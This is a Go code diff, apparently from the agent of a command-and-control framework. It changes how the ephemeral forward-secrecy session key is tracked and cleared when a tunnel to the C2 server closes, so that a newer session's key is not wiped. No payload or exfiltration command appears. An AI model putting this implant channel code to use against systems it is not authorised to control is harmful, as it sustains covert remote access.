@@ -109,9 +109,6 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 	)
 	go catchInterruptAndExit(ctx, cancel)
 	defer func() {
-		// The session is over: never let the ephemeral PFS key leak into the
-		// reconnect/check-in phase (which must use the static per-build PSK).
-		clearCurrentSessionKey()
 		go func() {
 			defer func() {
 				if r := recover(); r != nil {
@@ -141,7 +138,16 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 
 	// check for CC server's response
 	go func() {
+		// The ephemeral key this tunnel negotiated (if any). The read loop owns
+		// it: when the tunnel dies (read error / EOF / cancel) this goroutine is
+		// the one that observed it, and it clears the key it set — but only if a
+		// newer tunnel has not already replaced it (a racing reconnect or a
+		// second in-process tunnel installs its own key via setCurrentSessionKey).
+		var ownKey []byte
 		defer func() {
+			if len(ownKey) > 0 {
+				clearCurrentSessionKeyIf(ownKey)
+			}
 			if r := recover(); r != nil {
 				logging.Errorf("MsgTunneler response listener panic: %v\n%s", r, util.CallStack())
 			}
@@ -201,6 +207,11 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 				secureConn.SetKey(sessionKey)
 				logging.Successf("SecureConn: Switched to ephemeral session key (PFS enabled)")
 				pfsKeysExchanged = true
+				// Remember the key this tunnel negotiated so teardown only clears
+				// it if a newer session has not already replaced it.
+				cpy := make([]byte, len(sessionKey))
+				copy(cpy, sessionKey)
+				ownKey = cpy
 				// Publish the PFS key: every subsequent agent↔C2 stream (FTP, WWW,
 				// proxy) that EstablishC2Connection opens is re-keyed to it.
 				setCurrentSessionKey(sessionKey)
